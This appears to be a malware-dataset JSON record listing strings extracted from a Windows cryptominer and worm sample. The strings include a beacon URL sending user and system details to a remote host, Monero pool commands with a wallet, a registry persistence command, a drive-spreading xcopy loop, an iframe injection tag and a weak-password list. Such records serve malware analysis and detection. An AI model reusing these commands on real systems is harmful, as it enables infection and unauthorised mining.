{
    "malware_data": [
        {
            "filename": "4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb.exe",
            "filetype": "4D5A9000",
            "filesize": "306KB",
            "hash_sha256": "4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb",
            "strings": [
                "!This program cannot be run in DOS mode.",
                ".text",
                "P`.data",
                ".rdata",
                "`@.eh_fram",
                "0@.bss",
                ".idata",
                ".CRT",
                ".tls",
                ".rsrc",
                "$`TA",
                "[^_]",
                "$9`A",
                "$P`A",
                "gfff",
                "[,.:",
                "?&%=",
                "@!12",
                "3456",
                "7890",
                "/qwe",
                "rtyu",
                "iopa",
                "sdfg",
                "hjkl",
                "zxcv",
                "bnm ",
                "7[^_",
                ",[^_]",
                "tJv3",
                "p< tBv <@t,<Pt",
                "UWVS",
                "D$`;0@",
                "D$8u3",
                "L$(t",
                "L$h1",
                "D$8,GA",
                "D$8<GA",
                "D$@j9@",
                "D$8LGA",
                "$PdA",
                "$[dA",
                "D$8\\GA",
                "D$@.<@",
                "D$8lGA",
                "L$$w'",
                "CUNG",
                "D$8|GA",
                "D$@E@@",
                "D$@=A@",
                "|$``",
                "D$@uB@",
                "D$@qC@",
                "|$`@",
                "D$ 9",
                "$8eA",
                "$ieA",
                "$leA",
                "KwRUWVS",
                "uF<K",
                "u?<Fu;9",
                "9Ou*",
                ";X s",
                "8/u%",
                "8'tp",
                "<ntO<Etr",
                "<Et^<LtJ~",
                " [^_",
                "8Iu*",
                "F ;F$",
                "8EtI",
                "<rt_<Vt[<KtW",
                "C ;C$}",
                "S ;S$",
                "C ;C$",
                "8Jt(1",
                "83wd",
                "C<3w",
                "<St{<_tp<$",
                "tS:L$",
                "|[^_]",
                ":'u,",
                "l$`tl",
                "L[^_]",
                "91t\"",
                "T$H;",
                "D$$t",
                "$D}A",
                "$\\}A",
                "t$,tP",
                "D$,u",
                "0[^_",
                "gcc-",
                "shme",
                "m-td",
                "aaaa",
                "$0~A",
                "$J~A",
                "$`~A",
                "$x~A",
                ";0s8",
                "t,;(v6",
                "thWVS",
                "9;tZ",
                "<[^_]",
                "$;0s8",
                "&;0s<",
                ";h(s5",
                "9s(v+",
                "T$@9S(v5",
                "T$@B",
                "C;](",
                "tgHtX",
                ";t$ t",
                "9D$Pu",
                "9D$PtT",
                "A@Iu",
                "< us",
                "Y[^]",
                ".php",
                ".PHP",
                ".htm",
                ".HTM",
                ".xml",
                ".XML",
                ".dhtm",
                ".DHTM",
                ".phtm",
                ".xht",
                ".htx",
                ".mht",
                ".bml",
                ".asp",
                ".shtm",
                "anonymous",
                "Admin",
                "admin",
                "www-data",
                "administrator",
                "test",
                "password",
                "pass",
                "pass1234",
                "1234",
                "12345",
                "123456",
                "1234567",
                "12345678",
                "123456789",
                "1234567890",
                "qwerty",
                "devry",
                "000000",
                "111111",
                "123123",
                "abc123",
                "admin123",
                "derok010101",
                "windows",
                "123qwe",
                "email@email.com",
                "stafftest.ru",
                "hrtests.ru",
                "profetest.ru",
                "testpsy.ru",
                "pstests.ru",
                "qptest.ru",
                "prtests.ru",
                "jobtests.ru",
                "iqtesti.ru",
                "libgcj-13.dll",
                "_Jv_RegisterClasses",
                "Photo.scr",
                "%s/%s",
                "%TEMP%",
                "%s\\%s",
                "%80s",
                "<iframe src=Photo.scr width=1 height=1 frameborder=0>",
                "</iframe>",
                "http://hrtests.ru/S.php?ver=24&pc=%s&user=%s&sys=%s&cmd=%s&startup=%s/%s",
                "%APPDATA%",
                "%d.%d.%d.%d",
                "http://%s/test.html?%d",
                "Sr&w09.",
                "pool",
                "%s%d",
                "Section",
                "-p x",
                "-o stratum+tcp://mine.moneropool.com:3336 -t 1 -u 42n7TTpcpLe8yPPLxgh27xXSBWJnVu9bW8t7GuZXGWt74vryjew2D5EjSSvHBmxNhx8RezfYjv3J7W63bWS8fEgg6tct3yZ -p x",
                "/c start /b %%TEMP%%\\NsCpuCNMiner32.exe -dbg -1 %s",
                "RCDATA1",
                "%s\\NsCpuCNMiner32.exe",
                "/c (echo stratum+tcp://mine.moneropool.com:3333& echo stratum+tcp://monero.crypto-pool.fr:3333& echo stratum+tcp://xmr.prohash.net:7777& echo stratum+tcp://pool.minexmr.com:5555)> %TEMP%\\pools.txt",
                "open",
                "/c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Run\" /d \"%s\" /t REG_SZ /f",
                "/c for %%i in (A B C D E F G H J K L M N O P R S T Q U Y I X V X W Z) do xcopy /y \"%s\" %%i:\\",
                "std::exception",
                "std::bad_exception",
                "eh_globals",
                "init",
                "__gnu_cxx::__concurrence_lock_error",
                "__gnu_cxx::__concurrence_unlock_error",
                "pure virtual method called",
                "deleted virtual method called",
                "__terminate_handler_sh",
                "__unexpected_handler_sh",
                "terminate called recursively",
                "terminate called after throwing an instance of '",
                "terminate called without an active exception",
                "  what():  ",
                "_GLOBAL_",
                "(anonymous namespace)",
                "string literal",
                "auto",
                "[abi:",
                "{default arg#",
                "JArray",
                "vtable for ",
                "VTT for ",
                "construction vtable for ",
                "-in-",
                "typeinfo for ",
                "typeinfo name for ",
                "typeinfo fn for ",
                "non-virtual thunk to ",
                "virtual thunk to ",
                "covariant return thunk to ",
                "java Class for ",
                "guard variable for ",
                "TLS init function for ",
                "TLS wrapper function for ",
                "reference temporary #",
                " for ",
                "hidden alias for ",
                "transaction clone for ",
                "non-transaction clone for ",
                "_Sat ",
                "_Accum",
                "_Fract",
                "operator",
                "operator ",
                "new ",
                "false",
                "true",
                "java resource ",
                "decltype (",
                "this",
                "{parm#",
                "global constructors keyed to ",
                "global destructors keyed to ",
                "{lambda(",
                "{unnamed type#",
                " [clone ",
                " restrict",
                " volatile",
                " const",
                "complex ",
                "imaginary ",
                " __vector(",
                "std::allocator",
                "allocator",
                "std::basic_string",
                "basic_string",
                "std::string",
                "std::basic_string<char, std::char_traits<char>, std::allocator<char> >",
                "std::istream",
                "std::basic_istream<char, std::char_traits<char> >",
                "basic_istream",
                "std::ostream",
                "std::basic_ostream<char, std::char_traits<char> >",
                "basic_ostream",
                "std::iostream",
                "std::basic_iostream<char, std::char_traits<char> >",
                "basic_iostream",
                "alignof ",
                "const_cast",
                "delete[] ",
                "dynamic_cast",
                "delete ",
                "operator\"\" ",
                "new[]",
                "reinterpret_cast",
                "static_cast",
                "sizeof ",
                "throw",
                "throw ",
                "signed char",
                "bool",
                "boolean",
                "char",
                "byte",
                "double",
                "long double",
                "float",
                "__float128",
                "unsigned char",
                "unsigned int",
                "unsigned",
                "long",
                "unsigned long",
                "__int128",
                "unsigned __int128",
                "short",
                "unsigned short",
                "void",
                "wchar_t",
                "long long",
                "unsigned long long",
                "decimal32",
                "decimal64",
                "decimal128",
                "half",
                "char16_t",
                "char32_t",
                "decltype(nullptr)",
                "Mingw runtime failure:",
                "  VirtualQuery failed for %d bytes at address %p",
                "  Unknown pseudo relocation protocol version %d.",
                "  Unknown pseudo relocation bit size %d.",
                "use_fc_key",
                "fc_key",
                "sjlj_once",
                "fc_static",
                "_pthread_key_dest_shmem",
                "_pthread_cancelling_shmem",
                "_pthread_concur_shmem",
                "_pthread_tls_once_shmem",
                "_pthread_tls_shmem",
                "_pthread_key_lock_shmem",
                "_pthread_key_max_shmem",
                "_pthread_key_sch_shmem",
                "pthr_root_shmem",
                "pthr_last_shmem",
                "mtx_pthr_locked_shmem",
                "idList_shmem",
                "idListCnt_shmem",
                "idListMax_shmem",
                "idListNextId_shmem",
                "T%p %d %s",
                "T%p %d V=%0X H=%p %s",
                "once_obj_shmem",
                "once_global_shmem",
                "%p not found?!?!",
                " once %p is %d",
                "dummy_concurrency_level_shmem",
                "mutex_global_shmem",
                "c:/crossdev/src/winpthreads-svn6233/src/mutex.c",
                "(m_->valid == LIFE_MUTEX) && (m_->busy > 0)",
                "Assertion failed: (%s), file %s, line %d",
                "mutex_global_static_shmem",
                "M%p %d %s",
                "M%p %d V=%0X B=%d t=%d o=%d C=%d R=%d H=%p %s",
                "mxattr_recursive_shmem",
                "mxattr_errorcheck_shmem",
                "gcc-shmem-tdm2",
                "spin_locked_shmem",
                "rwl_global_shmem",
                "c:/crossdev/src/winpthreads-svn6233/src/rwlock.c",
                "(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)",
                "RWL%p %d %s",
                "RWL%p %d V=%0X B=%d r=%ld w=%ld L=%p %s",
                "cond_locked_shmem_rwlock",
                "C%p %d %s",
                "C%p %d V=%0X B=%d b=%p w=%ld %s",
                "cond_locked_shmem_cond",
                "N10__cxxabiv115__forced_unwindE",
                "N10__cxxabiv117__class_type_infoE",
                "N10__cxxabiv119__foreign_exceptionE",
                "N10__cxxabiv120__si_class_type_infoE",
                "N9__gnu_cxx24__concurrence_lock_errorE",
                "N9__gnu_cxx26__concurrence_unlock_errorE",
                "St13bad_exception",
                "St9exception",
                "St9type_info",
                "GCC: (tdm-2) 4.8.1",
                "FtpFindFirstFileA",
                "FtpGetFileA",
                "FtpOpenFileA",
                "FtpPutFileA",
                "InternetCloseHandle",
                "InternetConnectA",
                "InternetFindNextFileA",
                "InternetOpenA",
                "InternetOpenUrlA",
                "InternetReadFile",
                "InternetSetOptionA",
                "AddAtomA",
                "CloseHandle",
                "CreateEventA",
                "CreateFileA",
                "CreateMutexA",
                "CreateSemaphoreA",
                "DeleteCriticalSection",
                "DeleteFileA",
                "DuplicateHandle",
                "EnterCriticalSection",
                "ExitProcess",
                "ExpandEnvironmentStringsA",
                "FindAtomA",
                "FindResourceA",
                "GetAtomNameA",
                "GetCommandLineA",
                "GetCurrentProcess",
                "GetCurrentThread",
                "GetCurrentThreadId",
                "GetHandleInformation",
                "GetLastError",
                "GetModuleFileNameA",
                "GetModuleHandleA",
                "GetProcAddress",
                "GetProcessAffinityMask",
                "GetStartupInfoA",
                "GetThreadContext",
                "GetThreadPriority",
                "GetTickCount",
                "InitializeCriticalSection",
                "InterlockedDecrement",
                "InterlockedExchangeAdd",
                "InterlockedIncrement",
                "LeaveCriticalSection",
                "LoadResource",
                "LockResource",
                "QueryPerformanceCounter",
                "QueryPerformanceFrequency",
                "ReleaseMutex",
                "ReleaseSemaphore",
                "ResetEvent",
                "ResumeThread",
                "SetEvent",
                "SetLastError",
                "SetProcessAffinityMask",
                "SetThreadContext",
                "SetThreadPriority",
                "SetUnhandledExceptionFilter",
                "SizeofResource",
                "Sleep",
                "SuspendThread",
                "TlsAlloc",
                "TlsGetValue",
                "TlsSetValue",
                "TryEnterCriticalSection",
                "VirtualProtect",
                "VirtualQuery",
                "WaitForMultipleObjects",
                "WaitForSingleObject",
                "WriteFile",
                "_write",
                "__getmainargs",
                "__p__environ",
                "__p__fmode",
                "__set_app_type",
                "_beginthread",
                "_beginthreadex",
                "_cexit",
                "_endthread",
                "_endthreadex",
                "_ftime",
                "_iob",
                "_onexit",
                "_setjmp",
                "_setmode",
                "abort",
                "atexit",
                "calloc",
                "exit",
                "fclose",
                "fopen",
                "fprintf",
                "fputc",
                "fputs",
                "free",
                "fscanf",
                "fwrite",
                "longjmp",
                "malloc",
                "memcmp",
                "memcpy",
                "memmove",
                "memset",
                "printf",
                "rand",
                "realloc",
                "signal",
                "sprintf",
                "srand",
                "strcmp",
                "strcpy",
                "strlen",
                "strncpy",
                "strstr",
                "vfprintf",
                "ShellExecuteA",
                "WININET.DLL",
                "KERNEL32.dll",
                "msvcrt.dll",
                "SHELL32.DLL",
                "{{{{p",
                "M907=SH.",
                "M907=EA$!!$",
                "M92=HSAA$ ",
                " 1/K",
                "M97?HHAAAA$!",
                "M97?HE3",
                "#$3!",
                "u7?JH$",
                "AGS=",
                "C_^Jy",
                "!!!!!!",
                "!!!!!!!!!",
                "  ooH",
                "!!!!$$$!! \"\"ooH",
                "!!$$$$$$\"\"\"\"roJ",
                "$#$A@@\"\"\"\"CroH",
                "###$AAACC@C\"Crr^",
                "$@AAAAACC\"CC|o^",
                "!!##AAAECCCCCCCR|r^",
                "##AAEAECRUCRRRzr^",
                "$#@AAECUSUUURU_xr_",
                "#$AAEGGSUUUU_UUzr_",
                " $@AEAGSUUU_UU__",
                "$#3AEGGSUU_U__Uozxc",
                " ##$AEGGSU_Uc_U__",
                "$3AAGSUU_U____o",
                "$3AGGGUcU_c___ozxc",
                "$$3OGGWSUc__o__o",
                "$33OOGWWb^_ppppr",
                "$33OOSSb^pprrxz",
                "3OOSScbmx",
                "4O^gmz",
                "44S[gxz",
                "SS[gx{{z",
                "D-1.",
                "D;1.\"",
                "D;1.",
                "  & ",
                " &&&    (B\\",
                "&&>&>&&&&Y8",
                "%&>>>>((((h0",
                "%\">>J>L>((Qh8",
                "\">>J>LJ(L(hi0",
                "\">>JJJJLLLLht8",
                "&>J>JQQQQQQix0",
                "NTn%\"7>JJNQQQQQYt|>",
                "TN`\"\">>JJQQYYYQYt",
                "NNT\"7HJJNQ[YYYYYt",
                "TTT\"H>JJN[YYYYYht",
                "TNN7&JJJZYY[hhYht",
                "ZNN\"HHJOZY[^^^jjx",
                "TTTHHJJO[^^jjtjtx",
                "ZTa77JO[^jjuu~",
                "Z]e7JNZajz",
                "~tZNu",
                "Z]reyyyzujZOZuz",
                "Ze~oZeez",
                "00*) ",
                "4410*) ",
                "764410*) ",
                "99774410*)(",
                "!;<;9774410",
                "$<A<<;97744",
                "&@AAA@;;987",
                "+<AAA@@@;;9",
                "+AAAAAAA@@;",
                "3<AAAAAAA@;",
                "3+++!%!",
                "IHDR",
                "IDATx",
                "M=Bc`S",
                "$@^?&",
                "\"iR\")",
                "`r=F",
                "6s`~",
                "_#E%H",
                "kL&Q",
                "$YZ2@",
                "E(@%",
                "m\"I6",
                "Ynd1",
                "0&J!",
                "?'tA",
                "=thS",
                "Y|!=",
                "=;Dz",
                "o^\"7",
                "]Aa8",
                "@%0*",
                "@%C ",
                "A%c ",
                "!A220z",
                "A%0izc:;",
                "O>0E",
                "s5L9#",
                "@#;,",
                "Z%?y",
                "L!d1",
                "Xa\"H",
                "{HFs",
                "ORqo",
                "YGga",
                "0gV`",
                ",)[\"",
                "$Y~i",
                "E-8oBM",
                "4PJ!",
                "\"YwC)",
                "WH~?",
                "wun?9",
                "4@chy",
                "6^NZYN",
                "WPM~",
                "I9uV",
                "<,G[R",
                "u8~{b",
                "xf`Y@",
                "HSc.:\"",
                "87@0",
                "K{pU",
                "x.Pt",
                " Yp[K",
                "}~Iy",
                "KT&{",
                "aYhqS",
                "'`khy9p",
                "[X%E",
                "Pp.D~",
                "T>%$a",
                "+~/@",
                "~TY~&g",
                "+|9hS",
                "8Y'TO8",
                "=VI~",
                "rb9H",
                "Zy=x",
                "'k@~1o",
                "/bQk",
                "ha5`",
                "Fx]C",
                "..cD",
                "kUl4R",
                "&w%*",
                "D7'u",
                "[~i_",
                "w<}u",
                "%E-H",
                "6[$S",
                "aihU",
                "MN#n",
                "@Shy[",
                "jW)S",
                "pUP}",
                "];n?#",
                "w~@Sh",
                "uX*V",
                "KA{3",
                "$jih",
                "HdyY0`",
                "^?5$C",
                "[j/'",
                "%`uS",
                "d/)4",
                "Kp$r",
                "#?mg",
                "'d+%J",
                "Z<Gu-",
                "~^5w",
                "eM!k<",
                "IDAT/N~#*",
                "jrrWgs",
                "f|]d",
                "_E6r",
                "H4 n>",
                "K8_q",
                ":\"WY",
                "&#VW",
                "KGKA",
                "W[~zy",
                "SW)tC",
                "3W_{",
                "KG;1",
                ";f?D",
                "hL&=\\{",
                "*w8\"V;",
                "O~\\|?",
                "aC}1",
                "5*S]|I\\b",
                "V]*oQ",
                "\\V\"a",
                "86e5",
                "Wcs#",
                ":?0?",
                "Uz'VH",
                "_Qa^",
                "9ZF!",
                "z~NR",
                "yqd-",
                "B}}I1,",
                ")+FV",
                "pk/x",
                "nRWp",
                "l1)q",
                "WnZ~",
                "e9WqB",
                ")4T8",
                "W\\R:",
                "X__z+",
                "Dc5[",
                "l>z/",
                "C@FJC",
                "UD5?",
                ">??\"",
                "bQ~n",
                "o-hP",
                "!?K[",
                "XVB(",
                "nBuBT",
                "oIA~o",
                "75VI",
                "I=l& '/",
                ")rH$",
                "qvpd",
                "UHeyl@",
                "#]8Q",
                "du-2R",
                "'m!2!",
                "Vha*",
                "da#$.>",
                "@ue$",
                "]\"5a",
                "M wIF",
                "`7K\"",
                "EPMM+",
                "^5kp%h",
                "YbGI8;",
                "<<~/",
                "]I)X",
                "\"Xgh",
                "!|AO",
                "h~+C",
                "lu`fYL",
                "`*#-#",
                "29qF",
                "7n>C",
                "RPe7I|",
                ";FD09",
                "'?%-",
                "!m,&",
                "Qok<",
                "c2I0",
                "iY/?",
                "R%U1",
                "Z\\Jf;",
                "Zlt`",
                "H~ W",
                "YqS$3#E",
                "|Np#",
                "'?`2",
                "k|*)",
                "[b(*/-",
                "go<84w",
                "IDAT",
                ".@d\"",
                "jyF_ j",
                "6sG)5",
                "ssSa<2",
                "6;{,JX",
                "%OaY",
                "i>!)",
                "##GH!",
                "D>E9",
                "RX4I~",
                "yTE`",
                "=';0",
                "$e )",
                "Bp^E",
                "nm*ll",
                "@%}$",
                "5)44",
                "&^|q",
                "8i-$",
                "n;uj",
                "M`sKc<",
                "v2R>E",
                "tX6z",
                "^uzp",
                "Qrjk#",
                "sh~I",
                "92ea=",
                "hPNZ",
                "zR!c",
                "M=^Kt",
                "hBh1",
                "Y~;z",
                "IEND",
                "$5<9",
                "5NX/",
                "Richz3",
                "`.rdata",
                "@.data",
                ".vmp0",
                ".vmp1",
                ".reloc",
                "@.rsrc",
                "i/QF",
                "jy>F",
                "w'+j?#",
                "*j)>",
                "!a:0",
                "-T^e",
                "$<_TV",
                "?1a(&0",
                "n%TL",
                "p,WW",
                "x6 s",
                "[a'/",
                "NdPvWc",
                "B_#k",
                "urhx",
                "8plX",
                "'K(>",
                "iA+PP",
                "USER32.dll",
                "WS2_32.dll",
                "J!sw",
                ".?(E",
                "b+QM",
                "YM6\\",
                "+2:(`",
                "/91r",
                "w#3c",
                "sm;~",
                "YiT@+`N",
                "z|\\d",
                "T%Ej!x`",
                "_0aF",
                "3y~:",
                "yP\"~",
                "?0f%?",
                "b>#*",
                "{2C:",
                "cwGb",
                "{CLFgFo",
                "ss?$",
                "o'OA}",
                "_,h;",
                "vby;",
                "</s>",
                "#J!o",
                "b92z/",
                "82;_",
                "?sHT",
                "\\B2zq",
                "{@2w",
                "2y2B",
                "0z\\X",
                "q*d**",
                "q?f3",
                "~p\\9$s",
                "+E_A",
                "fbnjVR^3",
                "okWS_[*",
                "|qe9N",
                "^J&rf",
                "~nVfr",
                "\"oJo",
                "'A/a",
                "5Ufw",
                "2L_r",
                "cxq=",
                "pz\"!\"%",
                "26sJ",
                "c(9?",
                "a/|w",
                "s[e?",
                ";A#>{",
                "k*A~",
                "@}L]",
                "/r?z",
                "r\\FR",
                "q!?f~r",
                "=U5G",
                "%/_s",
                "\"O K",
                "[\"yC",
                "ora/",
                "90k=:l4z",
                "_#Mwn~Q2",
                "HA>s",
                "%0[,bb",
                "4V,En",
                "/pjS",
                "Js3;",
                "C_w<:",
                "GkB+",
                "WwvZV",
                "pP2Fs",
                "b-nz",
                "pu6j1~",
                "z~GB\"",
                "14cnA",
                "bkp~",
                "q#bw",
                "-Un+",
                "Wqc;",
                "\"<h3",
                "a#'@",
                "6l^0",
                "q.+x$H",
                "oDHT",
                "40<8$ ",
                "tp|xd`",
                "lhTP\\XD@",
                "51=9%!",
                "uq}yea",
                "miUQ]YEA",
                "62>:",
                "&\".*",
                "ZFBNJ",
                "GCOK",
                "vs%n",
                "o7d,",
                "7L)pS",
                "F:32",
                "p\"T)a:",
                ":>$#",
                ":>t/",
                "( :6/`>?hB:",
                "q>{`",
                "A>S`b",
                "jzq>Ke",
                "w+b#",
                ":z >#*p",
                "(:#7",
                "1>7_a",
                "Q>;O",
                "#gz#",
                "rS1o",
                "kRc&",
                "-/bR",
                "+\\pk",
                "+1[(",
                "W0-[W",
                "oc:2",
                " 3cz",
                " (=,",
                "SswM",
                "*'C[",
                "1ad /",
                "/pok",
                "Rs>?u",
                "R>k/o",
                "CbNy",
                "{S2(",
                "Pb/h",
                "sri~",
                "W#5v",
                "\\CaI",
                "0t.c",
                "/T~0",
                "-C0V",
                "y^j ",
                "lb2}p",
                "Rz\"b",
                "8!(\"",
                "WsD\"RQi",
                "3Ozss:",
                "jb{*2",
                "9b\"z",
                "_|98Y",
                "\"gqu",
                "$\">I",
                "Cp}J",
                ">z/+",
                "#@ tb",
                "0\"'wm",
                ".R{~2_r",
                "QRv#e",
                "Ur!R",
                "v7!Am",
                "0p(\"",
                ":1;a",
                "Rsocv",
                "nSit",
                "cA_q",
                "=k0}",
                "Dkrd",
                "7`bAv",
                "wd`Fg",
                "2{:R2#",
                "+B'*",
                "]myd",
                "=S#:N",
                ".oAw",
                ",*qV",
                "~y0S",
                "Qope",
                ",Niw0.Sg",
                "Bp+Qss-",
                "!,!0W#",
                "fzfYbr~z",
                "?:oB",
                "%R*r",
                "$s-R",
                "&!0B&",
                "'ck7'",
                "\"Yo.",
                "@B u",
                "2/Nj",
                "JF\"[",
                "Rn/~<",
                "_\"x/M",
                "x.;?",
                "SK`Xk",
                "v1a}",
                "U3BP",
                "vsNH",
                "B[$O<P{",
                "0Bi4-Fb",
                "pt[D6",
                "k2x]",
                "ZpK\"",
                "*Bi:\"",
                "GBjW",
                ";]2r",
                "Eyk3",
                "8tS2",
                "L:~r",
                ".7Wf",
                "l]H,",
                "hNcG1W",
                "|sv,",
                "Efz ",
                "BaX,",
                "'9,RQC",
                ",9aR",
                "-YR]}",
                "g;~9",
                "9xR`",
                "0&E ",
                "ikF9",
                "?Odv",
                "&@sR",
                "['i5RWh",
                "yAK9",
                "9k)19FR#z",
                "C)a=",
                "1u-FH",
                "CsH\"l|",
                "2RAsiP",
                "|>z1",
                "1+ds",
                "!vZ1",
                "1qIJ",
                "tepI",
                "P/-=",
                "nurr",
                "ra9S",
                "01SB",
                "dp0B",
                "_q@Bc0",
                "2)^}",
                "q*RY",
                "fcI40",
                "s2h\"r3",
                "*i>3",
                "TqNSq",
                "bI9~l",
                "1{<+",
                "tFqq",
                "cNpC",
                "`'JI",
                "oI*}",
                "31lhp\"",
                "YfV`",
                "12`SU",
                "#s1l",
                "i?\"qr",
                "F1sB",
                " _3S",
                "3Vrb",
                "]UKq",
                "#X33",
                "^]r1",
                "3\"s2",
                "s*A\"R",
                "KWI,[",
                "E1hRY",
                "yoQo",
                "L'1:R%0",
                "3I~%{",
                "<2s*",
                "2y(P2R",
                "!ICeL?",
                "Lc,1",
                "3u3{'",
                "3(IJHK",
                ".e3pX",
                "CpA?'",
                "9a)m",
                "r's0",
                "_?2}|2",
                "*af3Z",
                "?8sZ",
                "s~xP!",
                "LnS~A",
                "V19/$",
                "sx*Y",
                "[/r2",
                "AI+>",
                "@!2I#",
                "bAgY1:",
                "Wj=!",
                "DSy~@",
                "4Rs}",
                "2IQL",
                "#(?I",
                "$LSe6Z",
                "~PR]",
                "v1`~D",
                "CA=s",
                "EZ\\P",
                "d=]Br",
                "oPp3",
                "2tbQ",
                "2%1a",
                "\"`_I",
                "I|nPb6",
                "2a8r",
                "X03\\I",
                "dBIq",
                "Gg\\,",
                "\\rR&0",
                "Ijrb",
                " 1!qS",
                "4$qT",
                "a$km",
                "OE\"C",
                "&-|6J",
                "pGI\"2",
                ",q14",
                "MSy6",
                "vc/?CYra",
                "1kB%_",
                "CoPq",
                "s3(p#B",
                "cP!5p",
                "|WIhG",
                "!''Q",
                "I'p\"rZ4",
                "I~?>",
                "k,10k",
                "<1X3",
                "sb\\-q",
                "0 I,Z6S",
                "I&\"22",
                "I)X-",
                "q`R4",
                "!0PY",
                "-3Ri",
                "Ir>f3e",
                ";y|2c\\",
                "3.pQJ[8",
                "Y6^q",
                "NC_P",
                ":33I4g^",
                "D5=P",
                "=CEs1",
                "2Pd.[",
                ">)I\"",
                "r[W2",
                "#Ziq",
                "RILi",
                "r}bs",
                "fn1MSs",
                "0A@d",
                ",Imqe",
                "Q~*(h",
                "/P*e",
                "sR2~C+Q!|",
                "l63q0",
                "\"[0!",
                ",sIK",
                "(Iu7",
                "%I9F",
                "I6<m|2",
                "r,\"a",
                "3P<s",
                "}CruR",
                "#Nz@",
                "\\qDX",
                " w*s",
                "'.Sl",
                "`BAJ",
                "ci'R",
                "?bq@",
                "^vSN",
                ".\"6\\",
                "S|JQ",
                "B-Er",
                "iYE2",
                ".O'F",
                "<b}Q",
                "I5Hs",
                "7Pb*=",
                "22pR+",
                "$is(",
                "SsW!",
                "\\I\",",
                "I&kp",
                "n$p$",
                "R3w<",
                "H~2rg",
                "YLq@",
                "RhN6$",
                "<\",f",
                "bH91",
                "RedI",
                "okcq",
                "2)593",
                "1o+r",
                "2h3`",
                "cm2P{",
                "Q!sk",
                "3Ig97",
                "1I^\"",
                "s5Z1",
                "@\"<3",
                "rOpp",
                "b2eI~",
                "\"\\o2",
                "I\"nd",
                "WQSF",
                "1`3PB",
                "P3Jr",
                "3]3\"&",
                "2jEs",
                "81NB",
                "CfG.S",
                "^(sC6",
                "3:X1",
                "sq#I",
                "/>3QX",
                "22@J'",
                "1c.x",
                "Apri",
                "Cc6g~",
                "@df2sLf",
                "^zws",
                "a\"gI$#",
                "G'Cm",
                "gVP1az",
                "=IRs",
                "I6H2",
                ",49q",
                "ZHzR",
                ".SjIp",
                "I2e2by",
                " 1t\"",
                "&.>e",
                "?sT\"",
                "E3b*",
                "xy!vE",
                "P;13",
                "{Y1#I",
                "I~4s",
                "cqxR",
                "u{=1",
                "QgXU1",
                "?I{Es",
                "%<1S",
                "2vAQ0",
                "yPBB",
                "_\\Kq",
                "FV(b",
                "i*1L*[",
                "=qM!",
                "X)0q0pPA",
                "wQK;",
                "y@.m1",
                "QyBtN",
                "B\"Z;",
                "wRQRG",
                "rcR\"",
                "^/C\"",
                "PE=e9",
                "u8?0",
                "!UpPBp",
                "co7r",
                "by=$",
                "PZJU",
                "4S@s",
                "rI[-",
                "azN<Pg%",
                "1:S^",
                "IYJA",
                "1#R0a",
                "04g1S",
                "GVs9",
                "w>b~",
                "s23*s",
                "SXpI",
                "@33/1",
                "JPaI",
                "xNq)J",
                "~Q!#0",
                "ce0q",
                ",I*B",
                "BYIuk",
                "(2^J",
                "ygA2@v",
                "g4I ",
                "}pr ",
                ">)%1",
                "1^KI",
                "v Ir}",
                "`p@~e",
                "~pPH",
                "L1cR~u",
                ":;3B",
                " i1q",
                "F0a$",
                "1q1I",
                "LD%p",
                "sSXp!",
                "<!\"{P",
                "]LP2c",
                "3Krr",
                "PdmU",
                " wY8",
                "/Zzs",
                "-=qr3",
                "JHv{B",
                "3Y-S2",
                "zpqb",
                "<KE1",
                "W1@\"kz",
                "qf@P ",
                "6irQ",
                ")rhp",
                "\\qTJH",
                "22QC",
                "q yw",
                "1ZuP ",
                "{@rb",
                "CuNi",
                "QRBK",
                "}Rg!pa",
                "YIt <",
                ")Irvw",
                "ocR2a",
                "i- qak",
                "$)-G",
                "!xIX",
                "rR7$",
                "@}I^",
                "3;PP",
                "3K*1",
                "ZqAm",
                "^hJS",
                "p10_F",
                "I2~\"1",
                "IWq&",
                "Dd8P",
                "U$1=F",
                ")s~I",
                "MIq\"",
                "VyEU",
                "za{,g",
                "J=6$@",
                "OJ=7",
                ">J=r",
                "Q{<g",
                "{Ng,",
                "$4s`",
                "E^hU",
                "$?!o",
                "4s_Z",
                "4s{t",
                "4{S`%:",
                "I^XU",
                "K4s>I5@!",
                "4sWv",
                "tr^4o^",
                "*_^7n",
                "4sA?",
                "F^E0^",
                "4s$:",
                ".4sL",
                "{4s~",
                "U !;",
                "V^LU",
                "T^tU",
                "{^F1^",
                "4We'",
                "0w.!",
                "4sqg",
                "\"^sU",
                "^/&^",
                "4sUa",
                "4s:W",
                ":ES4s",
                "^32^",
                "z7G\"j",
                "2oX(}",
                "UO9;",
                "jm2x",
                "XaB=",
                "VZa^",
                "Z]cg",
                "10Kw",
                "e-p;A46",
                "2[%!",
                "Vd\"~",
                "X~`s1",
                "363x2",
                "K6|_",
                "LUnFj",
                "I$Ors",
                "/0P8",
                "Q?9y",
                "XzBB",
                "u>'M",
                "~srE",
                "ZL>s",
                "\"0ss",
                "o/Ik",
                "i$ Y",
                "n290.5",
                "!h^^",
                "^QML",
                "9W$p",
                ";rM?^",
                "clf1 W",
                ";RfU",
                "8 %Y",
                "~EzC?*",
                "fzGP0p",
                "c/?E",
                "r~^;oi\\",
                "0LPr",
                "t2~p",
                "1@2-&3",
                "2b:2D",
                "h\\@>",
                "lKJ@",
                "ZMGM",
                ":7IF",
                "D:VJ",
                "D~>zn",
                "s?t;N",
                "_OY:",
                "cb{s",
                "; V`",
                "nJN&",
                "U_LD",
                "GzwO",
                "\"jsmJe",
                "[p;<c_",
                ");LI@",
                "+hBm",
                "o8sZ",
                "1}/d",
                ":v|.v",
                "2]Vg",
                "6?o+",
                "w;yO",
                "RbwJ",
                "^j'k{",
                ";2`s",
                "GZfgkpb0",
                "1S#R",
                "gkcR;zr",
                "'6wz~",
                "#?\"Sn",
                "'~p&",
                "jVw8",
                "rgk}>",
                "EP;+",
                "_ppW?",
                "sr c",
                "Z2mB\"",
                "W?g ",
                "rSQW",
                "c}'8",
                "/om+",
                "WxaL",
                "r]$Vz",
                "Hf2g",
                ")crD",
                "5YSe",
                "6'*&",
                "z$gWA",
                "?S5{%",
                "T;w+",
                "9x&I",
                "2.sLi",
                "BJWc",
                "dkz_^",
                "!DbY|u",
                "Z*62<",
                ":teM",
                "U`a.",
                "9H L",
                "X3Z\\",
                "N}cWvdz ",
                ".Z(E",
